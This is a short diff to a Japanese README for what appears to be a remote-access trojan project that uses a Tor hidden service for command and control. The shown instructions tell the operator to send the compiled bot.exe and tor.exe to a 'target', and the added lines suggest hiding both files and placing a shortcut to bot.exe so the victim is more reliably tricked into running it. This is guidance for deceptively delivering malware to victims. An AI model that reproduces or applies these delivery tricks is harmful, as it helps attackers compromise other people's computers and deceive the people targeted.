@@ -58,7 +58,8 @@ $ sudo cat /var/lib/tor/hidden_service/hostname
 $ ./cnc.out
 ```
 そしたら、コンパイルしたbot.exeとtor.exeを同時にターゲットに送信してください。<br>
-そのときにtor.exeを隠しファイルに設定してzipファイルにして送るといいことがあります。
+そのときにtor.exeを隠しファイルに設定してzipファイルにして送るといいことがあります。<br><br>
+それかtor.exeとbot.exeを隠しファイルにして、bot.exeのショートカットを作ると確実に騙されるかも知れません。（知らんけど）
 
 ## 参考資料
 [RAT](https://github.com/ware255/RAT) <br>
